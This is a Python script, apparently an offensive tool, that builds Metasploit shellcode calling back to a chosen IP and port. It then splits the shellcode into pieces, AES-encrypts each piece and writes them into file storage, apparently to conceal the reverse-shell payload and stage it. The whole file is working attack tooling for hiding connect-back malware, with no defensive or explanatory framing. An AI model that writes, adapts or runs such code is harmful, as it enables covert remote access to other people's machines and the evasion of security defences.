#!/usr/bin/python

from Payload import Payload
from Cipher import AESCipher
from Storage import FileData;
import argparse
import math


parser = argparse.ArgumentParser()
parser.add_argument('--lhost', required=True, help='Connectback IP')
parser.add_argument('--lport', required=True, help='Connectback Port')
parser.add_argument('--passphrase', required=True, help='passphrase')
parser.add_argument('--filepath', required=True, help='filepath')
parser.add_argument('--msfroot', default='/usr/share/metasploit-framework')
args = parser.parse_args()
strshell = Payload._create_shellcode(args)
count = 0
prefix = 0
obj = FileData(args.filepath)
cipher = AESCipher(args.passphrase)
for line in strshell.splitlines():
    broken = line.split(',')
    lens = len(broken)
    size = math.ceil((lens / 4))
    if size == 1:
        toWrite = ''
        for i in range(len(broken)):
            toWrite = toWrite + broken[i]
        obj.write(str(prefix), str(count), cipher.encrypt(toWrite))
        count = count + 1
    else:
        start = 0
        end = 4
        for i in range(0, size):
            toWrite = ''
            for j in range(start, end):
                toWrite = toWrite + broken[j]
            if count == 255:
                count = 0
                prefix = 1

            obj.write(str(prefix), str(count), cipher.encrypt(toWrite))
            count = count + 1
            start = start + 4
            if end + 4 > lens:
                end = lens
            else:
                end = end + 4
